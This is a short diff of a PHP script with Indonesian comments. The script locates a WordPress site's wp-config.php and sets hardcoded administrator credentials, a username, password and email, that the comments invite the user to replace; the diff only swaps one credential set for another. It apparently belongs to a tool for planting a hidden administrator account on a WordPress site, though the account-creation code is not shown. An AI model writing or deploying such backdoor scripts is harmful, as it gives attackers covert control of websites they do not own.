@@ -7,9 +7,9 @@ $document_root = $_SERVER['DOCUMENT_ROOT'];
 $wp_config_path = $document_root . '/wp-config.php';
 
 // Variabel untuk data pengguna
-$user = 'admin22'; // Ganti dengan nama pengguna yang Anda inginkan
-$user_password = 'admin@221000'; // Ganti dengan kata sandi yang Anda inginkan
-$email = 'nsdadaddssdsw@gmail.com'; // Ganti dengan alamat email yang Anda inginkan
+$user = 'admin12'; // Ganti dengan nama pengguna yang Anda inginkan
+$user_password = 'admin12@000'; // Ganti dengan kata sandi yang Anda inginkan
+$email = 'asalnhsapow@gmail.com'; // Ganti dengan alamat email yang Anda inginkan
 
 // Periksa apakah file wp-config.php ada
 if (file_exists($wp_config_path)) {
